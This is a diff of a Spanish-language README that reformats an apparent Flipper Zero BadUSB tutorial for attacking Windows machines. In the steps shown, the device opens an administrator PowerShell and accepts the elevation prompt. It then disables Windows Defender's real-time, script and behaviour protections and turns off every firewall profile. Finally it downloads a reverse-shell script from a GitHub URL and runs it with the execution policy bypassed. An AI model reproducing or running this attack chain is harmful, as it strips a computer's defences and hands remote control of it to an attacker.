@@ -67,46 +67,45 @@ Conocimientos básicos de PowerShell.
 
 
 
-
- 1.  Con este comando en String abrimos la pestaña de Ejecutar.
+1.  Con este comando en String abrimos la pestaña de Ejecutar.
       ```sh g
       GUI r
       ```
 
 
 
- 1.  Abrimos Powershell.
+1.  Abrimos Powershell.
       ```sh g
       powershell
       ```
- 1.  Lo ejecutamos como administrador.
+1.  Lo ejecutamos como administrador.
       ```sh g
       CTRL-SHIFT ENTER
       ```
 
- 1.  Le damos a que sí cuando nos pregunte si queremos abrirlo como administrador.
+1.  Le damos a que sí cuando nos pregunte si queremos abrirlo como administrador.
       ```sh g
       ALT s
       ```
- 1.  Utilizamos este String para para deshabilitar el Windows Defender.
+1.  Utilizamos este String para para deshabilitar el Windows Defender.
       ```sh g
       powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -  
       DisableIntrusionPreventionSystem $true'
       ```
- 1.  Desactivamos el Firewall.
+1.  Desactivamos el Firewall.
       ```sh g
       Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
       ```
- 1.  Descargamos el ReverseShell con el String Invoke-WebRequest (Yo en mi caso lo tengo alojado en github).
+1.  Descargamos el ReverseShell con el String Invoke-WebRequest (Yo en mi caso lo tengo alojado en github).
       ```sh g
       Invoke-WebRequest -Uri "https://raw.githubusercontent.com/alvaroarenas69/scrips-powershell/main/reverseshell.ps1" -OutFile "reverseshell.ps1"
       ```
- 1.  Ejecutamos el ReverseShell.
+1.  Ejecutamos el ReverseShell.
       ```sh g
       powershell -ExecutionPolicy Bypass -File ".\reverseshell.ps1"
       ```
- 1.  Una vez creado el txt, lo guardamos. Conectamos el Flipper al PC mediante la aplicación qflipper, que podemos descargar en el siguiente      enlace: https://flipperzero.one/update
- 2.  Dentro de la aplicación, buscamos el fichero Read File y pegamos el txt en la carpeta BADUSB.
+1.  Una vez creado el txt, lo guardamos. Conectamos el Flipper al PC mediante la aplicación qflipper, que podemos descargar en el siguiente      enlace: https://flipperzero.one/update
+2.  Dentro de la aplicación, buscamos el fichero Read File y pegamos el txt en la carpeta BADUSB.
 
     
      ![imagen](https://github.com/90l3m0np13/Reverse-Zero/blob/main/im%C3%A1genes/badusb.png)
